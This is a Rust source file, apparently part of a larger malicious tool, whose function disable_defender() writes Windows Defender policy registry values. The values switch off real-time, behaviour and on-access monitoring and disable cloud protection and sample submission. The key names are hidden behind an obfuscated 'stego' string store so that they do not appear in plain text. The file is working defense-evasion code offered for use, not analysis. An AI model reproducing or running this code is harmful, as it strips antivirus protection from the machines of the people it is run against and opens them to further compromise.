use anyhow::{Context, Result};
use winreg::enums::*;
use winreg::RegKey;
use crate::core::stego_store::{StegoStore, StringCategory};

#[inline(always)] fn w(k: &str) -> String { StegoStore::get(StringCategory::Win, k) }

pub fn disable_defender() -> Result<()> {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);

    let dp = w("REG_DEFENDER_POLICY");
    let defender_policy = hklm.create_subkey(&dp)?.0;
    let _ = defender_policy.set_value(w("REG_DAS").as_str(), &1u32);

    let rtp = w("REG_RTP");
    let realtime_policy = defender_policy.create_subkey(&rtp)?.0;
    let _ = realtime_policy.set_value(w("REG_DRM").as_str(), &1u32);
    let _ = realtime_policy.set_value(w("REG_DBM").as_str(), &1u32);
    let _ = realtime_policy.set_value(w("REG_DOAP").as_str(), &1u32);
    let _ = realtime_policy.set_value(w("REG_DSORE").as_str(), &1u32);

    let spk = w("REG_SPYNET");
    let spynet_policy = defender_policy.create_subkey(&spk)?.0;
    let _ = spynet_policy.set_value(w("REG_DBAFS").as_str(), &1u32);
    let _ = spynet_policy.set_value(w("REG_SSC").as_str(), &2u32);
    let _ = spynet_policy.set_value(w("REG_SR").as_str(), &0u32);

    Ok(())
}
